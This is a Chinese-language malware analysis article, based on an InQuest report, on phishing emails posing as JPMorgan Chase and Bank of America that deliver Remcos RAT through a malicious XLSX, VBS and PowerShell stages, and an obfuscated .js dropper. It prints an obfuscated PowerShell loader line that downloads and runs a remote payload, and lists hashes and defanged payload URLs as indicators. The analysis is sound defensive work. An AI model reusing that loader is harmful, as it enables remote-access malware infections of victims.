近日，研究人员发现大量假借摩根大通银行和美国银行名义散发的钓鱼邮件，附件中会包含银行的名称和徽标。

![image.png-92kB](https://image.3001.net/images/20220128/1643355822_61f39eaeb75d396076401.png!small)摩根大通银行

![image.png-214kB](https://image.3001.net/images/20220128/1643355823_61f39eaf880a32e73a202.png!small)美国银行

该恶意 XLSX
文件（[c70048c0a6636b934623cebe544300c9a950c7bdd542ebe1b6dd06498ca1b915](https://labs.inquest.net/dfi/sha256/c70048c0a6636b934623cebe544300c9a950c7bdd542ebe1b6dd06498ca1b915)）会在启动时执行以下代码以加载第一阶段的
Payload。代码首先检查是否能够联网，接着下载并执行
Payload（[3cc322e6044691b7b2ce8937d90dccf0cb6b6692cbee40742356777762c2cc71](https://www.virustotal.com/gui/file/3cc322e6044691b7b2ce8937d90dccf0cb6b6692cbee40742356777762c2cc71)）。

> ping google.com;b4df='olnwoD.)tnei' + 'lCb';
> ,''gv6BNpMg30gwvPA=yekhtua&30212%3F148E16A9A6766D=diser&3F148E16A9A6766D=dic?daolnwod/moc.evil.evirdeno//:ptth''(eliFda';c3,we22
> -Join '';IEX(([regex]::Matches(env:temp+ '\twt.vbs')

第一阶段的 Payload 会加载下一阶段的 Payload，脚本使用了较为简单的方法（字符转十六进制）来隐藏下一阶段的恶意 URL。

![image.png-140.3kB](https://image.3001.net/images/20220128/1643355824_61f39eb05cba59fa1e569.png!small)tweet.vs

下载的 Payload 会被写入注册表并在系统重启时启动恶意软件。

![image.png-147.3kB](https://image.3001.net/images/20220128/1643355825_61f39eb1040dd8de4056a.png!small)tvt.vbs

![image.png-194.4kB](https://image.3001.net/images/20220128/1643355825_61f39eb1a28bee029ee4f.png!small)第二阶段

第二阶段的 Payload 是 PowerShell 脚本：

![image.png-86.8kB](https://image.3001.net/images/20220128/1643355826_61f39eb27fda4405c2253.png!small)PowerShell
脚本

攻击链的最后是一个 .js 脚本（
[ef3e6b1fb39341321591d2df51a29ff0365d5e997bcb7a10f4f1fbcd1a8468dd](https://www.virustotal.com/gui/file/ef3e6b1fb39341321591d2df51a29ff0365d5e997bcb7a10f4f1fbcd1a8468dd)），其中包含一个可执行库文件。下图可见，代码中增加了许多垃圾内容进行混淆，在运行时用零替换不必要的字符串再启动动态链接库。

![image.png-387.2kB](https://image.3001.net/images/20220128/1643355827_61f39eb3138c7deabb183.png!small).JS
文件

提取数据后可以得到一个使用 C# 编写的可执行库文件，这就是最后投递的恶意样本（
[b7fd83f6d8bbd17d4aefa8f4e28d4503f1c4ab6ab70401b1a67e209da6197cde](https://www.virustotal.com/gui/file/b7fd83f6d8bbd17d4aefa8f4e28d4503f1c4ab6ab70401b1a67e209da6197cde)、[73ee036d191c9b2d717e94b2bae87622fce097a42d61594ee8cc1ab5b92749f1](https://www.virustotal.com/gui/file/73ee036d191c9b2d717e94b2bae87622fce097a42d61594ee8cc1ab5b92749f1)）。

该文件是 Remcos RAT 远控木马，攻击者可以通过该恶意软件获取未授权的远程访问能力。

## IOC

> c70048c0a6636b934623cebe544300c9a950c7bdd542ebe1b6dd06498ca1b915  
> 87d78153d9d87c7e7e130feb052b1059837dcf6ebe0a128b75be75062ee11f9f  
> d874fc97e460e2c147782581d320f1673780ee99246286ce9d248c2a20a98773  
> 7e97a402dfea6b367245ba7a7b7e9811a867e23d4a339f14f79a7420b5b6f5a6  
> b1df072eba923c472e461200b35823fde7f8e640bfb468ff5ac707369a2fa35e  
> e37875bf204cb272dc38240363cc1e75929104b61ca0143441062b461ea8ce1f  
> 08a1259090d5bf015cfd80caa7ac3ff5060ad503825ea5a5f010cec03178c157  
> hxxp://104.223.119.167/calient.jpg  
> hxxp://104.223.119.167/han.jpg  
> hxxp://64.188.19.241/na.jpg  
> hxxp://64.188.19.241/atc.jpg  
> hxxp://64.188.19.241/rtc.jpg  
> hxxp://64.188.19.241/ghini.vbs

# 参考来源

> [INQUEST](https://inquest.net/blog/2022/01/24/analysis-remcos-rat-dropper)

